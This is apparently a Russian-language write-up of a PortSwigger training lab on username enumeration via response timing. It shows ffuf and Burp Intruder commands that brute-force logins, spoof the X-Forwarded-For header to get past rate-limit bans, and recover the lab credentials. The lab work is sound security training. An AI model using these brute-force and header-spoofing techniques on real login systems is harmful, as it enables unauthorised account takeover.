---
title: "Username enumeration via response timing"
date: 2025-09-04
tags: [web, authentication, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/authentication-vulnerabilities/password-based-vulnerabilities/authentication/password-based/lab-username-enumeration-via-response-timing"
classes: wide
---

Для решения лабы нужно подобрать логин и пароль для входа в учетки. Для входа в ЛК использую креды `wiener`:`peter`.

```
https://0a2d009d039780e4e8b4b89700b400f6.web-security-academy.net
```

## Solution

Зайду в учетку, чтобы собрать запрос: 

```http
POST /login HTTP/2
Host: 0a2d009d039780e4e8b4b89700b400f6.web-security-academy.net
Cookie: session=6GV8hoJHw5zimFu4FeHfusCpnjqR4SoK
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a2d009d039780e4e8b4b89700b400f6.web-security-academy.net/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://0a2d009d039780e4e8b4b89700b400f6.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

username=wiener&password=peter
```

Соберу команду для перебора с помощью [`ffuf`](https://cu63.github.io/tools/ffuf/):

```bash
ffuf -u https://0a2d009d039780e4e8b4b89700b400f6.web-security-academy.net/login -X POST -d "username=FUZZ&password=123" -w ~/wordlists/portswigger_logins
```

Упс... Я получил бан(

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Username_enumeration_via_response_timing/1.png){: height="200" .align-center}

Это получилось обойти с помощью установки заголовка `X-Forwarded-For: web-security-academy.net`:

```http
POST /login HTTP/2
Host: 0a2d009d039780e4e8b4b89700b400f6.web-security-academy.net
Cookie: session=6GV8hoJHw5zimFu4FeHfusCpnjqR4SoK
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a2d009d039780e4e8b4b89700b400f6.web-security-academy.net/login
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: https://0a2d009d039780e4e8b4b89700b400f6.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate[
]()Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
X-Forwarded-For: web-security-academy.net

username=wiener&password=123
```

Попробую запустить перебор еще раз:

```bash
ffuf -u https://0a2d009d039780e4e8b4b89700b400f6.web-security-academy.net/login -X POST -d "username=FUZZ&password=123" -w ~/wordlists/portswigger_logins -H 'X-Forward-For: web-security-academy.net'

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : https://0a2d009d039780e4e8b4b89700b400f6.web-security-academy.net/login
 :: Wordlist         : FUZZ: /Users/cu63/wordlists/portswigger_logins
 :: Header           : X-Forward-For: web-security-academy.net
 :: Data             : username=FUZZ&password=123
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

guest                   [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 55ms]
adsl                    [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 77ms]
adm                     [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 74ms]
administrators          [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 77ms]
adam                    [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 79ms]
puppet                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 81ms]
carlos                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 80ms]
vagrant                 [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 83ms]
admins                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 79ms]
adkit                   [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 77ms]
administracion          [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 77ms]
ansible                 [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 80ms]
acceso                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 77ms]
administrator           [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 83ms]
root                    [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 79ms]
admin                   [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 79ms]
administrador           [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 83ms]
academico               [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 79ms]
info                    [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 79ms]
wiener                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 79ms]
affiliates              [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 56ms]
affiliate               [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 56ms]
ag                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 56ms]
alaska                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 54ms]
ai                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 55ms]
akamai                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 60ms]
alabama                 [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 59ms]
ajax                    [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 56ms]
alpha                   [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 58ms]
albuquerque             [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 55ms]
alerts                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 59ms]
ak                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 65ms]
al                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 64ms]
amarillo                [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 60ms]
alterwind               [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 62ms]
agent                   [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 65ms]
agenda                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 75ms]
aix                     [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 76ms]
am                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 73ms]
afiliados               [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 65ms]
an                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 58ms]
americas                [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 57ms]
announce                [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 61ms]
anaheim                 [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 57ms]
announcements           [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 54ms]
apps                    [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 58ms]
apache                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 64ms]
app1                    [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 63ms]
application             [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 65ms]
apple                   [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 66ms]
app                     [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 71ms]
app01                   [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 71ms]
antivirus               [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 61ms]
applications            [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 65ms]
apollo                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 57ms]
analyzer                [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 137ms]
ap                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 88ms]
appserver               [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 88ms]
aq                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 56ms]
ao                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 59ms]
archie                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 57ms]
ar                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 58ms]
arizona                 [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 55ms]
asia                    [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 54ms]
athena                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 55ms]
arkansas                [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 58ms]
at                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 60ms]
arlington               [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 62ms]
au                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 60ms]
as400                   [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 100ms]
att                     [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 62ms]
as                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 105ms]
argentina               [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 134ms]
arcsight                [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 136ms]
atlanta                 [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 105ms]
asterix                 [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 108ms]
auction                 [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 64ms]
pi                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 55ms]
af                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 55ms]
oracle                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 94ms]
ec2-user                [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 63ms]
auto                    [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 56ms]
autodiscover            [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 90ms]
austin                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 57ms]
auth                    [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 57ms]
atlas                   [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 56ms]
azureuser               [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 65ms]
ftp                     [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 66ms]
adserver                [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 75ms]
test                    [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 85ms]
acid                    [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 73ms]
accounts                [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 94ms]
ads                     [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 94ms]
ae                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 97ms]
activestat              [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 99ms]
access                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 99ms]
accounting              [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 99ms]
administrator           [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 99ms]
ad                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 99ms]
mysql                   [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 100ms]
admin                   [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 100ms]
user                    [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 101ms]
:: Progress: [102/102] :: Job [1/1] :: 32 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

На текущий момент не вижу особой разницы. Предположу, если я ввел правильный логин, то происходит проверка пароля. Если же пароль будет длинным, то должно увеличиться время его проверки. Попробую это протестить:

```bash
ffuf -u https://0a2d009d039780e4e8b4b89700b400f6.web-security-academy.net/login -X POST -d "username=FUZZ&password=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" -w ~/wordlists/portswigger_logins -H 'X-Forward-For: web-security-academy.net'
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : https://0a2d009d039780e4e8b4b89700b400f6.web-security-academy.net/login
 :: Wordlist         : FUZZ: /Users/cu63/wordlists/portswigger_logins
 :: Header           : X-Forward-For: web-security-academy.net
 :: Data             : username=FUZZ&password=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

ads                     [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 56ms]
carlos                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 56ms]
ad                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 105ms]
adsl                    [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 110ms]
activestat              [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 115ms]
ansible                 [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 112ms]
ae                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 115ms]
adm                     [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 114ms]
adkit                   [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 118ms]
test                    [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 119ms]
administrators          [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 124ms]
academico               [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 117ms]
mysql                   [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 120ms]
oracle                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 132ms]
administrator           [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 137ms]
administrator           [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 143ms]
access                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 155ms]
azureuser               [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 157ms]
root                    [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 156ms]
wiener                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 162ms]
affiliates              [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 64ms]
affiliate               [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 62ms]
akamai                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 58ms]
ag                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 57ms]
alabama                 [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 57ms]
ai                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 56ms]
al                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 62ms]
afiliados               [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 63ms]
ak                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 63ms]
aix                     [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 63ms]
ajax                    [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 61ms]
alaska                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 64ms]
agenda                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 66ms]
alterwind               [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 56ms]
am                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 59ms]
alerts                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 65ms]
albuquerque             [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 62ms]
amarillo                [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 62ms]
alpha                   [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 64ms]
agent                   [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 63ms]
an                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 57ms]
americas                [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 59ms]
announce                [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 57ms]
antivirus               [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 58ms]
apple                   [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 64ms]
apollo                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 66ms]
anaheim                 [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 71ms]
app                     [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 71ms]
announcements           [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 70ms]
ap                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 76ms]
apache                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 75ms]
ao                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 74ms]
app01                   [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 77ms]
app1                    [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 83ms]
application             [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 56ms]
apps                    [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 57ms]
appserver               [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 66ms]
applications            [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 81ms]
analyzer                [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 72ms]
aq                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 66ms]
archie                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 57ms]
ar                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 57ms]
athena                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 61ms]
as                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 53ms]
arizona                 [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 58ms]
arlington               [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 63ms]
arkansas                [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 58ms]
as400                   [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 58ms]
asia                    [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 66ms]
at                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 59ms]
arcsight                [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 66ms]
au                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 56ms]
atlanta                 [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 56ms]
att                     [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 57ms]
adam                    [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 56ms]
ftp                     [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 56ms]
pi                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 59ms]
guest                   [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 59ms]
admin                   [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 59ms]
acid                    [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 59ms]
argentina               [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 57ms]
auth                    [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 58ms]
autodiscover            [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 55ms]
auto                    [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 59ms]
accounting              [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 56ms]
auction                 [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 57ms]
austin                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 57ms]
atlas                   [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 55ms]
asterix                 [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 55ms]
ec2-user                [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 58ms]
admins                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 58ms]
vagrant                 [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 61ms]
accounts                [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 63ms]
af                      [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 64ms]
administracion          [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 62ms]
user                    [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 63ms]
info                    [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 64ms]
administrador           [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 66ms]
acceso                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 66ms]
admin                   [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 68ms]
adserver                [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 66ms]
puppet                  [Status: 200, Size: 3194, Words: 1319, Lines: 64, Duration: 70ms]
:: Progress: [102/102] :: Job [1/1] :: 33 req/sec :: Duration: [0:00:03] :: Errors: 0 ::
```

Через некоторое время тестирования я понял, что меня блочит каждые 5-10 запросов( Решил использовать `Burp Intruder` для атаки. Для этого выбрал следующий запрос:

```http
POST /login HTTP/2
Host: 0a2d009d039780e4e8b4b89700b400f6.web-security-academy.net
X-Forwarded-For: 127.0.10.§val§
Content-Length: 125

username=§login§&password=1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
```

Выбрал тип атаки `Pitchfork`. Для 1 значения `val` выбрал числа от 1 до 255. Для 2 `login` - [список логинов](https://portswigger.net/web-security/authentication/auth-lab-usernames). В результате атаки нашел 2 подходящих логина, один из которых мне и так был известен.

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Username_enumeration_via_response_timing/2.png){: height="200" .align-center}

Теперь нужно перебрать пароли таким же образом по [этому](https://portswigger.net/web-security/authentication/auth-lab-passwords) списку.

```http
POST /login HTTP/2
Host: 0a2d009d039780e4e8b4b89700b400f6.web-security-academy.net
X-Forwarded-For: 127.0.11.§val§
Content-Length: 125

username=asterix&password=§passwd§
```

Был получен единственный ответ со статусом `302`. Значит это нужный пароль:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Username_enumeration_via_response_timing/3.png){: height="200" .align-center}

Вот полученные креды `asterix`:`football`. Зайду в ЛК. Для этого перехвачу запрос, чтобы добавить заголовок `X-Forwarded-For: ...`:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_authentication/IMG_Username_enumeration_via_response_timing/4.png){: height="200" .align-center}